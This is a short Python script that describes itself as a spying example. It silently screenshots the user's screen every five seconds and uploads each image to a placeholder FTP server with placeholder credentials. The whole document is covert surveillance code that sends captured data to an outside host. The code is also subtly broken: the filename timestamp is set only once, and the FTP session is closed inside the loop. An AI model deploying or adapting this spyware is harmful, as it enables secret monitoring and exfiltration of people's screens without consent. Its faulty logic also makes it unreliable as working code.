#This is a simple example of spying that takes a screenshot every 5 seconds and sends it to a FTP server.

from mss import mss
import time
import ftplib

session = ftplib.FTP('server.domain.com', 'username', 'password') #Replace it with your data
formatted_time = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())

while True:
    with mss() as sct:
     sct.shot()
     sct.shot(output=formatted_time +'.png')
     print("Saved as "+ formatted_time + '.png')

    file=open(formatted_time + '.png','rb')
    session.storbinary('STOR '+formatted_time + '.png', file)
    file.close()
    session.quit()
    print ("Sent to the server")

    time.sleep(5)
